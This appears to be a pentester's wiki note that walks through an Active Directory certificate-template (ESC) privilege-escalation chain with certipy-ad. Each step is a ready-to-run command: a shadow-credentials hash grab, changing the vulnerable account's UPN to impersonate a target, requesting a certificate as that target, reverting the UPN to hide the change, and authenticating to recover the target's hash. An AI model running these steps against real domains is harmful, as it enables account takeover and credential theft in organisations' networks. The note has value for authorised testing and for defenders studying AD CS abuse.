Vulnerable account is the account that was used to find the ESC vulnerability
Owned account is an account with [[Utilities/Windows Bloodhound Perms/Over a User/WriteOwner|WriteOwner]] or higher over the vulnerable account

Step time to match the Domain Controller:
```
sudo ntpdate <domain controller>
```

Get hash of vulnerable account:
```
certipy-ad shadow auto -username <username>@<domain> -p <password> -account <vulnAccount>
```

Change User Principal Name of vulnerable account to target account's:
```
certipy-ad account update -username <owned>@<domain> -hashes <hash> -user <vulnUser> -upn <target>
```

Request certificate for vulnerable account to masquerade as the target:
```
certipy-ad req -username <vulnUser>@<domain> -hashes <hash> -ca <certificateAuthority> -template <vulnTemplate> -target <domain>
```

Revert UPN of vulnerable account:
```
certipy-ad account update -username <owned>@<domain> -hashes <hash> -user <vulnUser> -upn <vulnUser>@<domain>
```

Recover hash of target account:
```
certipy-ad auth -pfx <username>.pfx -domain <domain> -dc-ip <ip>
```

